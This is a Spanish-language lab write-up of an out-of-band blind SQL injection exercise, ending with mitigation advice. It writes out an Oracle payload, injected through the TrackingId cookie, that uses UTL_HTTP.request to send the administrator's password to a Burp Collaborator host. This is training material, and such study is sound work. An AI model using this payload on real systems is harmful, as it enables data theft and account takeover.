Lab 17

Blind SQL injection with out-of-band data exfiltration

Información del laboratorio

Nivel: Practitioner

Tipo de SQLi: Out-of-band SQL Injection

Objetivo

Explotar una vulnerabilidad SQL Injection en la cookie de seguimiento para exfiltrar información de la base de datos mediante Burp Collaborator.

El objetivo es recuperar la contraseña del usuario administrator.

Procedimiento

Paso 1 — Interceptar la petición

Se interceptó la solicitud HTTP principal del sitio web utilizando Burp Suite.

El parámetro vulnerable se encontraba en la cookie: 

TrackingId

Paso 2 — Generar dominio de Burp Collaborator

Se generó un subdominio único utilizando la herramienta Burp Collaborator Client.

Paso 3 — Construir el payload

Se utilizó una carga útil diseñada para Oracle capaz de generar consultas DNS externas.

Payload utilizado

'||UTL_HTTP.request('http://SUBDOMINIO.burpcollaborator.net/'||
(SELECT password FROM users WHERE username='administrator'))--

El payload concatena el resultado de la consulta SQL con el dominio del Collaborator.

Paso 4 — Enviar la solicitud

La petición fue enviada desde Burp Repeater y posteriormente se consultaron las interacciones registradas en Burp Collaborator.

El servidor realizó una solicitud DNS hacia el subdominio incluyendo la contraseña del administrador en la URL.

Con las credenciales obtenidas se pudo iniciar sesión como administrador.

Mitigación recomendada

  • Uso de consultas parametrizadas.
  • Deshabilitar funciones externas innecesarias en la base de datos.
  • Control de tráfico DNS saliente.
  • Monitoreo de interacciones externas sospechosas.
